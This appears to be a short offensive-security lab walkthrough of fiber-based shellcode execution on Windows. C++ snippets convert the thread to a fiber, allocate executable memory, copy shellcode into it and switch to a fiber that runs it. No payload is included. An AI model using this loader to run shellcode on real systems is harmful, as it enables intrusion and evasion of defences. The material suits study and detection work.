## Overview
In this lab, we cover Injection through fibers technique, Fibers are a form of cooperative threading where a single thread can switch between multiple execution contexts (fibers), allowing the program to manually manage which fiber is active at any given time. This technique can be used for executing arbitrary shellcode, especially in situations where the attacker wants to execute the shellcode without creating a new thread.

## Steps
1. Convert the current thread into a fiber
2. Allocate memory for the shellcode
3. Copy shellcode into the allocated buffer
4. Create a new fiber to execute the shellcode
5. Switch to the fiber containing the shellcode

## Walkthrough

Converts the current thread into a fiber, which allows it to use fiber-related functions like `CreateFiber` and `SwitchToFiber`. This is required because a thread cannot call `SwitchToFiber` unless it has been converted to a fiber first.

```cpp

	PVOID mainFiber = ConvertThreadToFiber(NULL);
```
Allocates memory that will be used to store and execute the shellcode and copy shellcode into it.

```cpp
PVOID buffer = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(buffer, shellcode, sizeof shellcode);
```
Creates a new fiber that will start execution from the shellcode stored in `buffer`.

```cpp
PVOID bufferFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)buffer, NULL);
```
This switches execution from the current fiber (the mainFiber) to the fiber created in the previous step (bufferFiber). Once the switch happens, the execution context moves to the shellcode, which begins executing.

```cpp
SwitchToFiber(bufferFiber);
```
